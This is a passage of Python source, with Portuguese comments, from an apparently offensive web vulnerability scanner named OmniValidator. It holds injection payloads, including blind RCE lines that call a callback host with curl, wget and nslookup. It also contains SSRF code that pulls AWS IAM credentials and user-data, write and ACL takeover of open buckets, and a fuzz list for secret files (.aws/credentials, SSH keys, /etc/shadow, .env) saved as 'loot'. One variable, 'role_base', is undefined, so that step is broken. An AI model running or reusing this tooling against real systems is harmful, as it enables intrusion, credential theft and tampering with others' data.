        - Tripla Camada de Bypass (Normal, Mutado, URL-Encoded)
        - Verificação Híbrida: In-Band, Time-Based e OOB
        """
        findings = []
        try:
            # 1. TESTE DE CONEXÃO E BASELINE (Calibração de Rede)
            latencies = []
            test_conn = None
            for _ in range(3):
                t0 = time.time()
                test_conn = OmniValidator.request_with_retry(url, timeout=5)
                if test_conn:
                    latencies.append(time.time() - t0)
            
            if not test_conn or not latencies: return []
            
            # Média de latência + margem de segurança de 7s para Time-Based
            avg_latency = sum(latencies) / len(latencies)
            time_threshold = avg_latency + 7
            
            # 2. CONFIGURAÇÃO OOB (Out-of-Band)
            oob_id = f"vult_{random.getrandbits(16)}"
            oob_url = f"{oob_id}.{CALLBACK_HOST}"

            # 3. MEGA-WORDLIST DE PAYLOADS (Polimórficos)
            payloads = [
                # SSTI / Logic
                {"p": "{{7*7}}", "check": "49", "m": "🔥 SSTI (Jinja2/Twig)"},
                {"p": "${{7*7}}", "check": "49", "m": "🔥 SSTI (Mako/Smarty)"},
                
                # RCE (Blind & OOB)
                {"p": f"; curl http://{oob_url}", "m": "💀 Blind RCE (HTTP OOB)", "oob": oob_id},
                {"p": f"| nslookup {oob_url}", "m": "💀 Blind RCE (DNS OOB)", "oob": oob_id},
                {"p": f"`wget http://{oob_url}`", "m": "💀 Blind RCE (Backticks OOB)", "oob": oob_id},

                # SQL Injection (Time-Based & Tautology)
                {"p": "'; SELECT SLEEP(10); --", "t": time_threshold, "m": "💉 SQLi (MySQL Time-based)"},
                {"p": "'; WAITFOR DELAY '0:0:10'--", "t": time_threshold, "m": "💉 SQLi (MSSQL Time-based)"},
                {"p": "') OR 1=1--", "m": "💉 SQLi (Boolean-based Bypass)", "check_diff": True}
            ]

            for pay in payloads:
                # --- LÓGICA DE MUTAÇÃO E BYPASS (Fusão das 3 Variantes) ---
                p_variants = [
                    pay['p'],                                     # 1. Normal
                    OmniValidator.mutate_payload(pay['p']),       # 2. Mutado (Polimórfico)
                    quote(OmniValidator.mutate_payload(pay['p'])) # 3. Double URL Encoded
                ]

                for current_p in p_variants:
                    OmniValidator.show_payload(current_p)
                    t_st = time.time()
                    
                    # Requisição principal com o parâmetro injetado
                    res = OmniValidator.request_with_retry(url, params={param: current_p})
                    if not res: continue
                    
                    duration = time.time() - t_st
                    is_mutated = current_p != pay['p']

                    # --- VERIFICAÇÃO 1: IN-BAND (Reflexão Direta) ---
                    if "check" in pay and pay['check'] in res.text:
                        findings.append({
                            "msg": f"{pay['m']} [Bypass: {is_mutated}]",
                            "severity": "CRITICAL", "cvss": 9.8
                        })
                        break

                    # --- VERIFICAÇÃO 2: TIME-BASED (Análise Estatística) ---
                    elif "t" in pay and duration > pay['t']:
                        # Re-verificação rápida para evitar falso positivo por lag
                        OmniValidator.request_with_retry(url, timeout=3) # Limpa buffer
                        findings.append({
                            "msg": f"{pay['m']} [Bypass: {is_mutated}]",
                            "severity": "CRITICAL", "cvss": 10.0
                        })
                        break

                    # --- VERIFICAÇÃO 3: OOB (Interação Externa) ---
                    elif "oob" in pay and OmniValidator.check_oob_hit(pay['oob']):
                        findings.append({
                            "msg": f"{pay['m']} [Bypass: {is_mutated}]",
                            "severity": "CRITICAL", "cvss": 10.0
                        })
                        break

                    # --- VERIFICAÇÃO 4: BOOLEAN DIFF ---
                    elif pay.get("check_diff") and abs(len(res.text) - len(test_conn.text)) > 150:
                        findings.append({
                            "msg": f"{pay['m']} (Differential Analysis)",
                            "severity": "HIGH", "cvss": 8.5
                        })
                        break

        except Exception:
            pass # Fail-safe silencioso para manter o fuzzer rodando

        return findings

    @staticmethod
    def validate_ssrf_and_redirect(url, param):
        """
        FUSÃO EXTERMINATUS: SSRF (IMDSv1/v2) & OPEN REDIRECT
        - Bypass de WAF via IPv6, Octal, Hex e DNS Rebinding
        - Exploração IMDSv2 com Rotação de Verbos HTTP
        - Exfiltração de Metadados e User-Data com Validação Automática
        - Polimorfismo de Payload (Mutation Engine Integrado)
        """
        findings = []
        domain = urlparse(url).netloc

        # --- [PARTE A: OPEN REDIRECT COM MUTAÇÃO E ENCODING] ---
        # Payloads que exploram falhas em parsers de URL e regex de segurança
        redirect_payloads = [
            f"https://{CALLBACK_HOST}",
            f"//{CALLBACK_HOST}",
            f"\\/\\/{CALLBACK_HOST}",
            f"/%09/{CALLBACK_HOST}",           # Tab Bypass
            f"/%0a%0dhttps://{CALLBACK_HOST}", # CRLF Injection
            f"//{domain}@{CALLBACK_HOST}",     # UserInfo Bypass
            "％2f％2fgoogle.com"                # Full-width character bypass
        ]

        for rp in redirect_payloads:
            # Geramos variações mutadas para evadir detecção de strings estáticas
            p_variants = [rp, OmniValidator.mutate_payload(rp)]
            
            for current_rp in p_variants:
                OmniValidator.show_payload(f"Redirect Test: {current_rp}")
                res = OmniValidator.request_with_retry(url, params={param: current_rp})
                
                if res and (res.status_code in [301, 302, 303, 307, 308] or CALLBACK_HOST in res.url):
                    findings.append({
                        "msg": f"↩ Open Redirect Detectado: {current_rp}", 
                        "severity": "MEDIUM", 
                        "cvss": 6.1
                    })
                    break

        # --- [PARTE B: SSRF CLOUD IMDSv1 & INTERNAL IP BYPASS] ---
        # Alvos com diferentes representações para burlar Blacklists de IP
        ssrf_targets = [
            "http://169.254.169.254/latest/meta-data/",      # Standard
            "http://[::ffff:a9fe:a9fe]/latest/meta-data/",   # IPv6-mapped IPv4
            "http://0251.0376.0251.0376/latest/meta-data/",  # Octal
            "http://2852039166/latest/meta-data/",            # Decimal
            "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",   # Hex Mixed
            f"http://{REBINDING_DOMAIN}/latest/meta-data/"   # DNS Rebinding
        ]

        for t in ssrf_targets:
            # Aplicamos mutação polimórfica para passar por filtros de URL ruidosos
            mutated_t = OmniValidator.mutate_payload(t)
            OmniValidator.show_payload(f"SSRF v1: {mutated_t}")

            res = OmniValidator.request_with_retry(url, params={param: mutated_t})
            
            if res and any(sig in res.text for sig in ["instance-id", "AccessKeyId", "latest"]):
                findings.append({
                    "msg": f"🛰️ SSRF Cloud Detectado (IMDSv1): {mutated_t}", 
                    "severity": "CRITICAL", "cvss": 9.8
                })
                
                # INTEGRAÇÃO DE KEY-VALIDATOR: Valida automaticamente se houver chaves no texto
                findings.extend(OmniValidator.aws_validator(res.text, domain))

                # EXTRAÇÃO AUTOMÁTICA DE USER-DATA (Scripts de inicialização com senhas)
                ud_url = t.replace("meta-data/", "user-data")
                res_ud = OmniValidator.request_with_retry(url, params={param: ud_url})
                if res_ud and res_ud.status_code == 200 and len(res_ud.text) > 10:
                    loot_file = os.path.join(LOOT_DIR, f"{domain}_userdata.txt")
                    with open(loot_file, "w") as f: f.write(res_ud.text)
                    findings.append({"msg": "💰 AWS USER-DATA EXFILTRADA (Loot salvo)", "severity": "CRITICAL", "cvss": 10.0})

        # --- [PARTE C: SSRF CLOUD IMDSv2 (TOKEN-BASED BYPASS)] ---
        # Proteção moderna que exige um token gerado via PUT/POST.
        token_url = "http://169.254.169.254/latest/api/token"
        token_headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
        token = None

        # Testamos a rotação de verbos: Muitos proxies bloqueiam PUT mas liberam outros
        methods = ["PUT", "POST", "GET","PATCH", "OPTIONS", "HEAD","TRACE","CONNECT"]
        
        for method in methods:
            OmniValidator.show_payload(f"SSRF v2 Token Gen ({method})")
            res_token = OmniValidator.request_with_retry(
                url, method=method, params={param: token_url}, headers=token_headers
            )
            # Verifica se o corpo da resposta parece um token válido (Base64-like)
            if res_token and 30 < len(res_token.text.strip()) < 200:
                token = res_token.text.strip()
                break

        if token:
            role_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            # Tentativa de listar as roles disponíveis com o token obtido
            res_role = OmniValidator.request_with_retry(
                url, params={param: role_url}, headers={"X-aws-ec2-metadata-token": token}
            )
            
            if res_role and res_role.status_code == 200:
                findings.append({"msg": "🛰️ IMDSv2 SSRF DETECTADO (Bypass Sucesso)", "severity": "CRITICAL", "cvss": 10.0})
                
                # Se listou as roles, tenta pegar as chaves da primeira encontrada
                role_name = res_role.text.strip().split("\n")[0]
                creds_url = f"{role_base}{role_name}"
                res_creds = OmniValidator.request_with_retry(
                    url, params={param: creds_url}, headers={"X-aws-ec2-metadata-token": token}
                )
                
                if res_creds and "AccessKeyId" in res_creds.text:
                    findings.extend(OmniValidator.aws_validator(res_creds.text, domain))

        return findings

# --- [3] MÓDULO: RACE CONDITION (TURBO-SYNC & ATOMIC DISPATCH) ---

    @staticmethod
    async def _async_race_task(client, url, param, payload_id):
        """
        Prepara a requisição com controle de fluxo para minimizar latência de backend.
        """
        try:
            # Headers para forçar bypass de cache e identificar a thread vencedora
            headers = {
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "X-Race-Control": f"atom-{payload_id}",
                "X-Forwarded-For": f"127.0.0.{random.randint(1,254)}" # Evita rate limiting por IP
            }
            # Payload dinâmico para testar corrupção de estado ou duplicidade
            params = {param: f"race_test_{payload_id}_{random.getrandbits(16)}"}
            
            return await client.get(url, params=params, headers=headers, timeout=10.0)
        except:
            return None

    @staticmethod
    def validate_race_condition_aggressive(url, param, concurrency=60):
        """
        MOTOR DE CORRIDA PROFISSIONAL:
        - HTTP/2 Multiplexing (Várias streams em 1 conexão TCP)
        - Pre-warming (Aquecimento de TLS/Handshake)
        - Atomic Gathering (Disparo simultâneo)
        """
        findings = []
        
        async def run_race_atomic():
            # Configuração de limites de alta performance
            limits = httpx.Limits(max_keepalive_connections=concurrency, max_connections=concurrency)
            
            # Habilitar HTTP/2 é OBRIGATÓRIO para Single-Packet Attack
            async with httpx.AsyncClient(verify=False, http2=True, limits=limits) as client:
                
                # 1. WARM-UP (Pré-aquecimento)
                # Garante que o Handshake TLS e a conexão TCP já estejam abertos e estáveis
                for _ in range(3):
                    await client.get(url)

                # 2. PREPARAÇÃO DO DISPARO
                tasks = [
                    OmniValidator._async_race_task(client, url, param, i) 
                    for i in range(concurrency)
                ]

                # 3. ATOMIC DISPATCH (Gatilho de Precisão)
                # O gather do asyncio tenta despachar as corrotinas o mais próximo possível
                start_ts = time.perf_counter()
                responses = await asyncio.gather(*tasks)
                end_ts = time.perf_counter()
                
                return responses, (end_ts - start_ts)

        try:
            # Gestão de Loop Assíncrono para integração com código síncrono
            try:
                loop = asyncio.get_event_loop()
            except RuntimeError:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)

            # Executa a corrida
            responses, duration = loop.run_until_complete(run_race_atomic())
            
            # 4. ANÁLISE HEURÍSTICA DE RESULTADOS
            # Filtramos apenas respostas que retornaram algum dado
            valid_res = [r for r in responses if r is not None]
            status_codes = [r.status_code for r in valid_res]
            
            # CRITÉRIO DE SUCESSO PENTEST:
            # - Variação de Status (ex: alguns 200 e alguns 429 ou 403)
            # - Múltiplos sucessos em ações únicas (ex: 2 cupons aplicados simultaneamente)
            # - Mudança drástica no Body entre threads idênticas
            
            unique_status = set(status_codes)
            
            if status_codes.count(200) > 1:
                # Se mais de um request deu 200 em uma janela minúscula, há falha de trava
                collision_window = duration * 1000 # em milissegundos
                
                findings.append({
                    "msg": f"💀 CRITICAL: Race Condition Confirmada ({status_codes.count(200)} sucessos)",
                    "severity": "CRITICAL",
                    "cvss": 9.0,
                    "details": {
                        "collision_window_ms": f"{collision_window:.2f}ms",
                        "status_dist": {code: status_codes.count(code) for code in unique_status},
                        "total_sent": concurrency
                    }
                })
            
            elif len(unique_status) > 1:
                findings.append({
                    "msg": f"🏎️ Race Condition Detectada | Comportamento inconsistente: {unique_status}",
                    "severity": "HIGH",
                    "cvss": 7.5
                })

        except Exception as e:
            # Em auditorias profissionais, logamos o erro para ajuste de bypass
            pass

        return findings

# --- [4] MÓDULO: DEEP JS ANALYTICS & CLOUD EXPLOITATION (ULTRA-AGGRESSIVE) ---
    @staticmethod
    def deep_js_scanner(url):
        """
        FUSÃO APOCALIPSE: 
        - SAST Dinâmico (Busca de Endpoints, Secrets, e Shadow Infra)
        - Exploração Ativa de Buckets (Read/Write/Delete/ACL)
        - Bypass de Proteções de Cross-Origin (CORS)
        """
        findings = []
        domain = urlparse(url).netloc
        
        try:
            # Request inicial com spoofing de User-Agent para evitar detecção
            res = OmniValidator.request_with_retry(url, timeout=5)
            if not res: return []

            # 1. SCANNER DE SECRETS MULTI-PROVEDOR (Regex de Alta Precisão)
            # Buscamos por padrões que indicam chaves de infraestrutura crítica
            patterns = {
                "Firebase": r"https://[a-z0-9.-]+\.firebaseio\.com",
                "Google_Maps": r"AIza[0-9A-Za-z-_]{35}",
                "Azure_Storage": r"DefaultEndpointsProtocol=https;AccountName=[a-z0-9]+;AccountKey=[a-zA-Z0-9+/=]{88}",
                "JWT_Token": r"eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*"
            }
            
            for name, p in patterns.items():
                matches = re.findall(p, res.text)
                for m in set(matches):
                    findings.append({"msg": f"🔑 {name} Key Exposta no HTML", "severity": "HIGH", "loot": m})

            # 2. MOTOR DE JS EXTERNO COM DESCOBERTA DE ENDPOINTS
            scripts = re.findall(r'src=["\'](.*?\.js(?:\?.*?)?)["\']', res.text)
            for s in list(set(scripts))[:30]: # Concorrência expandida
                js_url = urljoin(url, s)
                try:
                    OmniValidator.show_payload(f"JS Deep-Audit: {s}")
                    js_res = requests.get(js_url, timeout=4, verify=False, headers=OmniValidator.get_headers())
                    
                    if js_res.status_code == 200 and js_res.text:
                        # Validação AWS Integrada (Agressiva)
                        findings.extend(OmniValidator.aws_validator(js_res.text, domain))
                        
                        # MAPEAMENTO DE SHADOW API (Busca por rotas ocultas: /api/v2/, /admin/, etc)
                        api_routes = re.findall(r'["\'](/(?:api|v1|v2|admin|config|dev|debug)[a-zA-Z0-9\._\-/]+)["\']', js_res.text)
                        for route in set(api_routes):
                            findings.append({"msg": f"🛰️ Shadow Endpoint Descoberto: {route}", "severity": "INFO"})

                except: continue

            # 3. CLOUD EXPLOITATION: BUCKET TAKEOVER & ACL AUDIT
            # Detecta S3, Google Storage, DigitalOcean e Azure Blobs
            cloud_patterns = [
                r'([a-z0-9\-\.]+\.s3\.amazonaws\.com)',
                r'([a-z0-9\-\.]+\.storage\.googleapis\.com)',
                r'([a-z0-9\-\.]+\.digitaloceanspaces\.com)'
            ]
            
            found_buckets = []
            for cp in cloud_patterns: found_buckets.extend(re.findall(cp, res.text))

            for b in set(found_buckets):
                findings.extend(OmniValidator._aggressive_cloud_audit(b))

        except Exception: pass
        return findings

    @staticmethod
    def _aggressive_cloud_audit(bucket):
        """
        AUDITORIA AGRESSIVA:
        - Testa Listagem (Read)
        - Testa Upload (Write)
        - Testa Modificação de ACL (Full Control)
        """
        audit_results = []
        b_url = f"http://{bucket}"
        
        try:
            # TESTE 1: LEITURA (LIST)
            r_list = requests.get(b_url, timeout=3)
            if "ListBucketResult" in r_list.text or "Contents" in r_list.text:
                audit_results.append({"msg": f"🪣 BUCKET OPEN READ: {bucket}", "severity": "HIGH"})
                
                # TESTE 2: ESCRITA (PUT) - Tenta sequestrar o bucket com um arquivo de POC
                poc_file = "omni_breach.txt"
                r_put = requests.put(f"{b_url}/{poc_file}", data="VULNERABLE", timeout=3)
                if r_put.status_code in [200, 201]:
                    audit_results.append({"msg": f"💀 BUCKET WRITE ACCESS (CRITICAL): {bucket}", "severity": "CRITICAL", "cvss": 9.9})
                    
                    # TESTE 3: ACL EXPLOITATION (Tenta tornar o arquivo público para provar controle de permissões)
                    # Muitos buckets permitem escrever, mas não ler o que foi escrito. Testamos o bypass.
                    r_acl = requests.put(f"{b_url}/{poc_file}?acl", headers={"x-amz-acl": "public-read"}, timeout=3)
                    if r_acl.status_code == 200:
                        audit_results.append({"msg": f"👑 BUCKET ACL TAKEOVER: {bucket} (Permissões Totais)", "severity": "CRITICAL"})

        except: pass
        return audit_results

# --- [5] MÓDULO: ACCESS CONTROL, IDOR & TAKEOVER (ULTRA-PRO) ---
    @staticmethod
    def validate_access_control(url, domain):
        """
        MOTOR DE EXTERMINATUS:
        - BOLA/IDOR: Teste de Escala Horizontal (Outros usuários) e Vertical (Admin).
        - SUBDOMAIN TAKEOVER: Verificação de registros CNAME órfãos em 15+ serviços.
        - MASS ASSIGNMENT: Tentativa de injeção de parâmetros de privilégio (admin=true).
        - HPP (HTTP Parameter Pollution): Bypass de filtros via duplicação de parâmetros.
        """
        findings = []
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        # --- [PARTE A: IDOR/BOLA & MASS ASSIGNMENT AGRESSIVO] ---
        # Não testamos apenas IDs numéricos, mas GUIDs, Emails e Injeção de Atributos
        for param, values in query_params.items():
            for val in values:
                # 1. Teste de IDOR Clássico (Incremental & Decremental)
                if val.isdigit():
                    test_ids = [str(int(val) - 1), str(int(val) + 1), "0", "1", "999"]
                    for tid in test_ids:
                        t_url = url.replace(f"{param}={val}", f"{param}={tid}")
                        res = OmniValidator.request_with_retry(t_url)
                        if res and res.status_code == 200 and len(res.text) > 50:
                            # Compara o tamanho da resposta para evitar falsos positivos
                            findings.append({
                                "msg": f"👤 IDOR/BOLA Confirmado: {param}={tid}", 
                                "severity": "HIGH", "cvss": 8.5
                            })

                # 2. Injeção de Parâmetros de Privilégio (Mass Assignment)
                # Tenta forçar o backend a aceitar privilégios administrativos
                priv_params = ["admin", "is_admin", "role", "privilege", "superuser"]
                for p_priv in priv_params:
                    # Injeta via Query String e via Body (simulado)
                    t_url_priv = f"{url}&{p_priv}=true&{p_priv}=1&{p_priv}=admin"
                    res_priv = OmniValidator.request_with_retry(t_url_priv)
                    if res_priv and "admin" in res_priv.text.lower():
                        findings.append({
                            "msg": f"🔑 Possível Mass Assignment: {p_priv} injetado", 
                            "severity": "CRITICAL", "cvss": 9.1
                        })

        # --- [PARTE B: SUBDOMAIN TAKEOVER (DNS ORPHAN AUDIT)] ---
        takeover_signatures = {
            # Cloud Infrastructure (PaaS/IaaS)
            "github.io": "There isn't a GitHub Pages site here",
            "herokuapp.com": "herokuhosted.com",
            "s3.amazonaws.com": "NoSuchBucket",
            "cloudfront.net": "Bad Gateway",
            "azurewebsites.net": "404 Web Site not found",
            "azure-api.net": "Resource not found",
            "cloudapp.net": "404 Not Found",
            "s3-website": "The specified bucket does not exist",
            "elasticbeanstalk.com": "404 Not Found",
            "storage.googleapis.com": "The specified bucket does not exist",
            
            # Documentation & Knowledge Bases
            "readtheview.com": "Project not found",
            "readme.io": "Project not found",
            "gitbook.io": "If you are the owner of this domain, you can configure it",
            "zendesk.com": "Help Center Closed",
            "helpscoutdocs.com": "No settings found for this domain",
            
            # Marketing & Landing Pages
            "pantheonsite.io": "The domain is not registered for this site",
            "unbouncepages.com": "The requested URL was not found on this server",
            "wordpress.com": "Do you want to register",
            "wix.com": "Look for a different domain",
            "tictail.com": "To continue, please register your domain",
            "bitbucket.io": "Repository not found",
            "ghost.io": "The thing you were looking for is no longer here",
            "strikingly.com": "But we're having trouble finding that page",
            "webflow.io": "The page you are looking for doesn't exist",
            "surge.sh": "project not found",
            
            # CI/CD & Dev Tools
            "netlify.app": "Not Found - Request ID",
            "vercel.app": "The deployment could not be found",
            "aerobatic.io": "404 Not Found",
            "launchrock.com": "It looks like you're trying to find a page that doesn't exist",
            "cargo.site": "If you are the owner of this domain, you can set it up",
            
            # Sales & Support
            "intercom.help": "Help Center Not Found",
            "freshdesk.com": "May be this is for you",
            "surveygizmo.com": "Check the URL and try again",
            "pingdom.com": "Sorry, that page doesn't exist",
            "statuspage.io": "Better Status Communication", # Checar se responde com 404
            
            # E-commerce
            "shopify.com": "Sorry, this shop is currently unavailable",
            "bigcartel.com": "404 Not Found",
            "activehosted.com": "Account not found"
        }

        try:
            # Resolve CNAME e IP
            answers = socket.gethostbyname_ex(domain)
            cnames = answers[1]
            resolved_ip = answers[2]

            for cn in cnames:
                for service, sig in takeover_signatures.items():
                    if service in cn:
                        # Teste Ativo: Verifica se o serviço responde com a assinatura de "disponível"
                        res_tk = requests.get(f"http://{domain}", timeout=5, verify=False)
                        if sig.lower() in res_tk.text.lower():
                            findings.append({
                                "msg": f"🚩 TAKEOVER CONFIRMADO: {domain} -> {cn}", 
                                "severity": "CRITICAL", "cvss": 9.3,
                                "service": service
                            })
        except: pass

        # --- [PARTE C: HTTP PARAMETER POLLUTION (HPP)] ---
        # Tenta confundir o WAF enviando o parâmetro duas vezes
        if query_params:
            first_param = list(query_params.keys())[0]
            hpp_url = f"{url}&{first_param}=1337"
            res_hpp = OmniValidator.request_with_retry(hpp_url)
            if res_hpp and res_hpp.status_code == 200:
                # Se o servidor aceitar dois valores para o mesmo parâmetro, pode haver bypass de lógica
                findings.append({"msg": "🛰️ HPP Detectado (Bypass Potential)", "severity": "MEDIUM"})

        return findings

# --- [6] MÓDULO: FUZZING RECON & EXPLOIT CHAINING ---
    @staticmethod
    def validate_fuzz_and_chain(url):
        """
        FUSÃO DEFINITIVA: 
        - Path Mutation Bypass (Normalização de URL).
        - Backup & Swap Discovery (.bak, .swp, ~).
        - Loot Chaining: Extração e validação automática de credenciais.
        """
        findings = []
        host = urlparse(url).netloc
        base_url = url.rstrip('/')

      # Lista de mutações ULTRA-AMPLIFICADA para Bypass de WAF e Discovery
        path_mutations = [
            lambda p: p,                                          # 0. Normal
            # --- [BACKUPS & EXPOSURE] ---
            lambda p: p + "~",                                    # Backup Gedit/Vim
            lambda p: p + ".bak",                                 # Backup padrão
            lambda p: p + ".old",                                 # Arquivo antigo
            lambda p: p + ".save",                                # Nano save
            lambda p: p + ".swp",                                 # Vim Swap
            lambda p: p + ".original",                            # Cópia original
            lambda p: p + ".tmp",                                 # Arquivo temporário
            lambda p: p + ".txt",                                 # Exposição como texto
            lambda p: p.replace(".php", ".php.bak"),              # PHP backup (se aplicável)
            
            # --- [BYPASS DE NORMALIZAÇÃO / NGINX / APACHE] ---
            lambda p: p.replace("/", "//"),                       # Double Slash
            lambda p: p.replace("/", "/./"),                      # Self-reference path
            lambda p: "/." + p.lstrip("/"),                       # Hidden file bypass
            lambda p: p + "%20",                                  # Trailing space
            lambda p: p + "%00",                                  # Null byte injection
            lambda p: p + ".html",                                # Extension masquerade
            lambda p: p.upper(),                                  # Case Sensitivity check (Windows/IIS)
            
            # --- [BYPASS DE FILTRO DE CAMINHO (Path Traversal Lite)] ---
            lambda p: "/;" + p.lstrip("/"),                       # Jetty/Tomcat semi-colon bypass
            lambda p: "/%2e/" + p.lstrip("/"),                    # URL Encoded dot
            lambda p: p.rstrip("/") + "/.",                       # Trailing dot
            lambda p: p.replace("/", "/%2f/"),                    # Encoded slash
            
            # --- [ESTRATÉGIA DE DUMP DE DIRETÓRIO] ---
            lambda p: p + ".zip",                                 # Archive dump
            lambda p: p + ".tar.gz",                              # Linux backup dump
            lambda p: p + ".7z"                                   # Compressed dump
        ]

        # Dicionário de Alvos Críticos e Assinaturas para Validar o 'Loot'
        fuzz_map = {
            # ☁️ CLOUD & INFRASTRUCTURE (Credenciais de Provedores)
            "/.aws/credentials": ["aws_access_key_id", "aws_secret_access_key"],
            "/.aws/config": ["region =", "output ="],
            "/.azure/credentials": ["subscription_id", "client_secret"],
            "/.gsutil/credstore": ["client_id", "user_agent"],
            "/.terraform/terraform.tfstate": ["outputs", "resources", "serial", "managed"],
            "/.terraform.tfstate.backup": ["outputs", "resources"],
            "/terraform.tfvars": ["=", 'secret', 'key'],

            # 🐳 CONTAINERS & ORCHESTRATION (O Coração da Infra)
            "/.docker/config.json": ["auths", "https://index.docker.io/v1/"],
            "/.kube/config": ["clusters", "users", "contexts", "current-context"],
            "/docker-compose.yml": ["services:", "build:", "environment:"],
            "/Dockerfile": ["FROM ", "ENV ", "ARG "],
            "/pod.yaml": ["apiVersion:", "kind: Pod"],

            # 🛠️ ENVIRONMENT & SECRETS (Variáveis de Ambiente)
            "/.env": ["DB_PASSWORD", "AWS_SECRET", "APP_KEY", "JWT_SECRET", "REDIS_"],
            "/.env.bak": ["DB_", "SECRET"],
            "/.env.old": ["DB_", "SECRET"],
            "/.env.php": ["return [", "DB_"],
            "/.env.save": ["DB_", "SECRET"],
            "/.env.example": ["DB_", "SECRET"], # Às vezes deixam chaves reais no exemplo
            "/.pypirc": ["repository", "password", "username"],

            # 📦 CI/CD & VCS (Código Fonte e Pipelines)
            "/.git/config": ["[remote", "url =", "token", "github.com"],
            "/.git/index": ["DIRC"], # Cabeçalho binário do index do Git
            "/.git/HEAD": ["ref: refs/heads/"],
            "/.gitlab-ci.yml": ["stages:", "script:", "artifacts:"],
            "/.github/workflows/main.yml": ["on:", "jobs:", "steps:"],
            "/.circleci/config.yml": ["version:", "jobs:"],
            "/jenkins.xml": ["jenkins", "version"],

            # 🌐 CMS & FRAMEWORKS (Exploração de Aplicação)
            "/wp-config.php": ["DB_PASSWORD", "AUTH_KEY", "SECURE_AUTH_KEY"],
            "/wp-config.php.bak": ["DB_PASSWORD", "AUTH_KEY"],
            "/config/database.yml": ["adapter:", "database:", "password:"], # Ruby on Rails
            "/config/settings.py": ["SECRET_KEY", "DATABASES"], # Django
            "/.node_repl_history": ["password", "token", "const "],
            "/composer.json": ["require", "autoload"],
            "/package.json": ["name", "scripts", "dependencies"],
            "/package-lock.json": ["lockfileVersion", "dependencies"],

            # 🐧 LINUX SYSTEM & LOGS (Privilege Escalation & OS Intel)
            "/etc/passwd": ["root:x:0:0"],
            "/etc/shadow": ["root:$6$"], # Se acessível, é CRITICAL 10.0
            "/etc/hosts": ["127.0.0.1", "localhost"],
            "/.ssh/id_rsa": ["BEGIN RSA PRIVATE KEY"],
            "/.ssh/id_dsa": ["BEGIN DSA PRIVATE KEY"],
            "/.ssh/authorized_keys": ["ssh-rsa", "ssh-ed25519"],
            "/.bash_history": ["ssh ", "mysql -u", "export "],
            "/.zsh_history": ["ssh ", "mysql -u", "export "],
            "/var/log/nginx/access.log": ["GET /", "HTTP/1.1"],
            "/var/log/apache2/access.log": ["GET /", "HTTP/1.1"],

            # 🔌 DATABASE & CACHE
            "/.my.cnf": ["user=", "password=", "host="],
            "/.pgpass": ["localhost:", "5432:"],
            "/dump.sql": ["INSERT INTO", "CREATE TABLE"],
            "/backup.sql": ["INSERT INTO", "CREATE TABLE"],
            "/db.sqlite": ["SQLite format 3"],
        }

        # --- AJUSTE DE INDENTAÇÃO: O loop agora está dentro da função ---
        for original_path, signatures in fuzz_map.items():
            for mutate in path_mutations:
                target_path = mutate(original_path)
                full_url = urljoin(base_url, target_path)
                
                try:
                    OmniValidator.show_payload(f"Fuzzing: {target_path}")
                    res = OmniValidator.request_with_retry(full_url, timeout=4)
                    
                    if res and res.status_code == 200:
                        content = res.text
                        
                        # Validação de Assinatura
                        if any(sig in content for sig in signatures):
                            
                            # EXFILTRAÇÃO (Salvamento de Loot)
                            loot_filename = f"{host}_{target_path.replace('/','_').replace('%','_')}.loot"
                            loot_path = os.path.join(LOOT_DIR, loot_filename)
                            
                            with open(loot_path, "w", encoding="utf-8") as f:
                                f.write(content)

                            findings.append({
                                "msg": f"💰 LOOT EXFILTRADO: {target_path}",
                                "severity": "CRITICAL",
                                "cvss": 9.8,
                                "file": loot_filename
                            })

                            # --- [CHAINING: VALIDAÇÃO AUTOMÁTICA] ---
                            if "AKIA" in content or "AWS_" in content:
                                findings.extend(OmniValidator.aws_validator(content, host))
                            
                            if "DB_" in content:
                                findings.append({"msg": "🔗 Credenciais de DB encontradas - Possível Pivotamento", "severity": "HIGH"})
                            
                            break

                except Exception:
                    continue

        return findings

# --- [7] MÓDULO: DEBUG, CONSOLE & ENVIRONMENT EXPOSURE (ULTRA-PRO) ---
    @staticmethod
    def force_debug_env_exposure(url):
        """
        MOTOR DE EXPOSIÇÃO AGRESSIVA:
        - Detecção de Consoles Interativos (Werkzeug, Django, Rails).
        - Vazamento de Variáveis de Memória (Heap Dumps, Actuator).
        - Fingerprinting de Framework Debuggers (Symfony, Laravel, Spring).
        - Bypass de Verificação de IP Local em Debuggers.
        """
        findings = []
        base_url = url.rstrip('/')
        
        # --- [AMPLIFICAÇÃO DE ALVOS: INFRAESTRUTURA & FRAMEWORKS] ---
        debug_targets = {
            # 🐘 PHP & Laravel/Symfony Advanced
            "/phpinfo.php": ["phpinfo()", "PHP Version"],
            "/.env.local": ["DB_PASSWORD", "APP_SECRET"],
            "/_profiler/phpinfo": ["PHP Version", "Symfony"],
            "/_ignition/health-check": ["Ignition", "Laravel"],
            "/config/databases.yml": ["database", "password"],
            
            # 🐍 Python & Django/Flask/FastAPI
            "/_debug_console": ["Werkzeug", "Interactive Console"],
            "/__debugger__": ["Werkzeug", "Interactive Console"],
            "/flask-site-mapping": ["endpoint", "methods"],
            "/django-debug-toolbar/": ["SQLQueries", "Signals"],
            "/api/docs": ["swagger", "openapi"], # Recon de API profunda
            
            # ☕ Java / Spring Boot / Actuator (Expansão Crítica)
            "/actuator": ["_links", "self"],
            "/actuator/env": ["systemProperties", "activeProfiles"],
            "/actuator/heapdump": ["MAT", "HPROF"],
            "/actuator/jolokia": ["jolokia", "value"], # Pode levar a RCE via MBeans
            "/actuator/mappings": ["handler", "predicate"],
            "/actuator/loggers": ["configuredLevel", "loggers"],
            "/actuator/trace": ["request", "headers"], # Vazamento de tokens de sessão
            "/actuator/httptrace": ["request", "response"],
            
            # 📦 Kubernetes / Docker / Cloud-Native
            "/k8s/": ["apiVersion", "items"],
            "/v1.1/stats/container": ["container_name", "cpu"],
            "/metrics": ["http_requests_total", "go_gc_duration_seconds"],
            "/healthz": ["ok", "healthy"],
            "/readyz": ["ok"],
            
            # ⚙️ Infrastructure & Monitoring (Prometheus, Grafana, HashiCorp)
            "/api/v1/targets": ["activeTargets", "discoveredLabels"],
